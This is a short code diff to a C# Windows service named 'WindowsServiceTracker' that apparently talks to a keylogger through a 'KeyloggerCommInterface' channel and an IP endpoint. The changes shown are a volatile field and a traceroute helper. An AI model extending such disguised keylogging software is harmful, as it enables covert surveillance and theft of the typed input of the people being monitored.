@@ -33,7 +33,7 @@ namespace WindowsServiceTracker
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
 
         //Variables
-        private String ipAddressString = "127.0.0.1";
+        private volatile String ipAddressString = "127.0.0.1";
         private long ipAddress = 0x0100007F; //default to local host
         private IPEndPoint ipPort;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
@@ -86,7 +86,6 @@ namespace WindowsServiceTracker
             }
             catch (Exception)
             { }
-
             ipPort = new IPEndPoint(ipAddress, PORT);
 
             CreateOpenPipe();
@@ -321,6 +320,25 @@ namespace WindowsServiceTracker
                 return true;
             }
             return false;
+        }
+
+        private String traceRoute(String address)
+        {
+            String ipString = String.Empty;
+            IEnumerable<IPAddress> ipList = IP.getTraceRoute(address);
+            foreach (IPAddress nodeAddress in ipList)
+            {
+                ipString += nodeAddress + "~";
+            }
+            try
+            {
+                ipString = ipString.Remove(ipString.Length - 1);
+            }
+            catch (ArgumentOutOfRangeException)
+            {
+
+            }
+            return ipString;
         }
     }
 }
